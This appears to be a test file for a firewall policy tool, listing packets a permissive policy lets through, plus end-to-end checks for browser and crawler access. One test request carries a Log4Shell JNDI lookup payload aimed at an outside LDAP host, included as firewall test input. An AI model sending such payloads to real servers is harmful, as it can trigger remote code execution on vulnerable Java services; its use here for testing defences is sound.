export const port = 80;

export default function ({ f, run, get, post }) {
  run(f, "a GET", get("/"), "pass", { dport: port });
  run(f, "a request another policy would reset", post("/roller-services/xmlrpc", "", "${jndi:ldap://203.0.113.9/a}"), "pass", { dport: 8080 });
  run(f, "UDP", "\x00\x01", "pass", { dport: 53, proto: 17 });
}

/* Sent through a firewall enforcing this policy with `pfw apply -f` (test/e2e.mjs). */
export const e2e = ({ url }) => [
  { name: "a browser", curl: [`${url}/`], want: "served" },
  { name: "a crawler", curl: ["-A", "GPTBot/1.2", `${url}/`], want: "served" },
];
